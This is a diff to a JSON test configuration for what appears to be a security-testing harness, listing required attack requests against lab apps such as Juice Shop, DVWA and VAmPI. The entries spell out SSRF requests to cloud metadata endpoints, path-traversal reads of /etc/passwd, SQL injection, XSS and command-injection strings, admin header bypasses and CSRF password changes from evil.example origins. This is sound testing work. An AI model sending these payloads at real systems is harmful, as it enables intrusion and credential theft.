+            "body_exact": "{\"imageUrl\":\"file:///etc/passwd\"}"
+          },
+          {
+            "id": "ssrf-5",
+            "method": "POST",
+            "path": "/juice-shop/profile/image/url",
+            "payload_class": "profile-image-ssrf",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"imageUrl\":\"http://169.254.169.254/latest/meta-data/\"}"
+          },
+          {
+            "id": "ssrf-6",
+            "method": "POST",
+            "path": "/juice-shop/profile/image/url",
+            "payload_class": "profile-image-ssrf",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"imageUrl\":\"http://metadata.google.internal/computeMetadata/v1/\"}"
+          },
+          {
+            "id": "traversal-0",
+            "method": "GET",
+            "path": "/etc/passwd",
+            "payload_class": "download-path-traversal",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-1",
+            "method": "GET",
+            "path": "/juice-shop/ftp/..../..../etc/passwd",
+            "payload_class": "download-path-traversal",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-2",
+            "method": "GET",
+            "path": "/juice-shop/ftp/%2e%2e/%2e%2e/etc/passwd",
+            "payload_class": "download-path-traversal",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-3",
+            "method": "GET",
+            "path": "/juice-shop/ftp/..%252f..%252f/etc/passwd",
+            "payload_class": "download-path-traversal",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-4",
+            "method": "GET",
+            "path": "/juice-shop/ftp/package.json.bak%2500.md",
+            "payload_class": "download-path-traversal",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-5",
+            "method": "GET",
+            "path": "/juice-shop/ftp/package.json.bak%00.md",
+            "payload_class": "download-path-traversal",
+            "minimum_dispatches": 1
+          }
+        ]
+      }
     },
     {
       "id": "juice-shop-exploits/10-jwt-attacks",
@@ -12772,7 +13910,146 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "fingerprint-0",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "waf-fingerprint-payload",
+            "minimum_dispatches": 1,
+            "query_regex": "^id='\\ OR\\ 1=1\\-\\-$"
+          },
+          {
+            "id": "fingerprint-1",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "waf-fingerprint-payload",
+            "minimum_dispatches": 1,
+            "query_regex": "^q=<script>alert\\(1\\)</script>$"
+          },
+          {
+            "id": "fingerprint-2",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "waf-fingerprint-payload",
+            "minimum_dispatches": 1,
+            "query_regex": "^cmd=;cat\\ /etc/passwd$"
+          },
+          {
+            "id": "fingerprint-3",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "waf-fingerprint-payload",
+            "minimum_dispatches": 1,
+            "query_regex": "^file=\\.\\./\\.\\./\\.\\./etc/passwd$"
+          },
+          {
+            "id": "fingerprint-4",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "waf-fingerprint-payload",
+            "minimum_dispatches": 1,
+            "query_regex": "^id=%27%20OR%201%3D1\\-\\-$"
+          },
+          {
+            "id": "fingerprint-5",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "waf-fingerprint-payload",
+            "minimum_dispatches": 1,
+            "query_regex": "^id=%2527%2520OR%25201%253D1\\-\\-$"
+          },
+          {
+            "id": "fingerprint-6",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "waf-fingerprint-payload",
+            "minimum_dispatches": 1,
+            "query_regex": "^id=%EF%BC%87%20OR%201=1\\-\\-$"
+          },
+          {
+            "id": "fingerprint-7",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "waf-fingerprint-payload",
+            "minimum_dispatches": 1,
+            "query_regex": "^q=%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E$"
+          },
+          {
+            "id": "fingerprint-8",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "waf-fingerprint-payload",
+            "minimum_dispatches": 1,
+            "query_regex": "^q=<ScRiPt>alert\\(1\\)</ScRiPt>$"
+          },
+          {
+            "id": "fingerprint-9",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "waf-fingerprint-payload",
+            "minimum_dispatches": 1,
+            "query_regex": "^id=1\\&id=%27%20OR%201%3D1$"
+          },
+          {
+            "id": "fingerprint-10",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "waf-fingerprint-payload",
+            "minimum_dispatches": 1,
+            "query_regex": "^q=safe\\&q=<script>alert\\(1\\)</script>$"
+          },
+          {
+            "id": "fingerprint-11",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "waf-fingerprint-payload",
+            "minimum_dispatches": 1,
+            "query_regex": "^id='\\ OR\\ 1=1\\-\\-$",
+            "headers": {
+              "x-forwarded-for": "127.0.0.1"
+            }
+          },
+          {
+            "id": "fingerprint-12",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "waf-fingerprint-payload",
+            "minimum_dispatches": 1,
+            "headers": {
+              "x-original-url": "/admin"
+            }
+          },
+          {
+            "id": "fingerprint-13",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "waf-fingerprint-payload",
+            "minimum_dispatches": 1,
+            "headers": {
+              "x-rewrite-url": "/admin"
+            }
+          },
+          {
+            "id": "fingerprint-14",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "waf-fingerprint-payload",
+            "minimum_dispatches": 1,
+            "query_regex": "^q='><script>alert\\(1\\)</script>\\-\\-\\ OR\\ 1=1$"
+          },
+          {
+            "id": "fingerprint-15",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "waf-fingerprint-payload",
+            "minimum_dispatches": 1,
+            "query_regex": "^q='\\ OR\\ 1=1\\-\\-><script>alert\\(1\\)</script>;cat\\ /etc/passwd;\\.\\./\\.\\./etc/shadow$"
+          }
+        ]
+      }
     },
     {
       "id": "restaurant-exploits/01-register-auth",
@@ -20125,7 +21402,114 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "csrf-0",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/csrf/",
+            "payload_class": "csrf-request",
+            "minimum_dispatches": 1,
+            "query_values": {
+              "password_new": "hacked",
+              "password_conf": "hacked",
+              "Change": "Change"
+            }
+          },
+          {
+            "id": "csrf-1",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/csrf/",
+            "payload_class": "csrf-request",
+            "minimum_dispatches": 1,
+            "body_exact": "password_new=hacked&password_conf=hacked&Change=Change"
+          },
+          {
+            "id": "csrf-2",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/csrf/",
+            "payload_class": "csrf-request",
+            "minimum_dispatches": 1,
+            "body_exact": "password_new=hacked&password_conf=hacked&Change=Change",
+            "headers": {
+              "origin": "http://evil.example"
+            }
+          },
+          {
+            "id": "csrf-3",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/csrf/",
+            "payload_class": "csrf-request",
+            "minimum_dispatches": 1,
+            "body_exact": "password_new=hacked&password_conf=hacked&Change=Change",
+            "headers": {
+              "referer": "http://evil.example/csrf-attack.html"
+            }
+          },
+          {
+            "id": "csrf-4",
+            "method": "PUT",
+            "path": "/vampi/users/v1/admin/password",
+            "payload_class": "csrf-request",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"password\":\"hacked123\"}",
+            "headers": {
+              "content-type": "application/json"
+            }
+          },
+          {
+            "id": "csrf-5",
+            "method": "PUT",
+            "path": "/vampi/users/v1/admin/password",
+            "payload_class": "csrf-request",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"password\":\"hacked123\"}",
+            "headers": {
+              "content-type": "application/json",
+              "origin": "http://evil.example",
+              "authorization": "Bearer fake-token-csrf-test"
+            }
+          },
+          {
+            "id": "csrf-6",
+            "method": "GET",
+            "path": "/juice-shop/rest/user/whoami",
+            "payload_class": "csrf-request",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "csrf-7",
+            "method": "POST",
+            "path": "/juice-shop/api/Users",
+            "payload_class": "csrf-request",
+            "minimum_dispatches": 1,
+            "body_exact": "{\"email\":\"csrf@evil.example\",\"password\":\"Test1234\",\"passwordRepeat\":\"Test1234\"}",
+            "headers": {
+              "content-type": "application/json",
+              "origin": "http://evil.example"
+            }
+          },
+          {
+            "id": "csrf-8",
+            "method": "GET",
+            "path": "/juice-shop/rest/basket/1",
+            "payload_class": "csrf-request",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "csrf-9",
+            "method": "POST",
+            "path": "/dvwa/vulnerabilities/csrf/",
+            "payload_class": "csrf-request",
+            "minimum_dispatches": 1,
+            "body_exact": "password_new=hacked&password_conf=hacked&Change=Change",
+            "headers": {
+              "origin": "http://evil.example"
+            }
+          }
+        ]
+      }
     },
     {
       "id": "web-app-attacks/10-file-upload",
